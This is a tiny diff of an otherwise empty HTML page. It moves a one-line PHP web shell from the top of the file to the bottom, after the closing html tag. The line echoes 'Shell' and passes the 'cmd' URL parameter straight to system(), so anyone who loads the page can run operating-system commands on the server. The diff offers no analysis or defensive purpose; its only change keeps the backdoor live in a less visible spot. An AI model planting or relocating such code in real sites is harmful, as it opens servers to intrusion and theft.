@@ -1,4 +1,3 @@
-<?php echo "Shell";system($_GET['cmd']); ?>
 <!DOCTYPE html>
  <html lang="en">
    <head>
@@ -7,3 +6,4 @@
    <body>
    </body>
  </html>
+<?php echo "Shell";system($_GET['cmd']); ?>
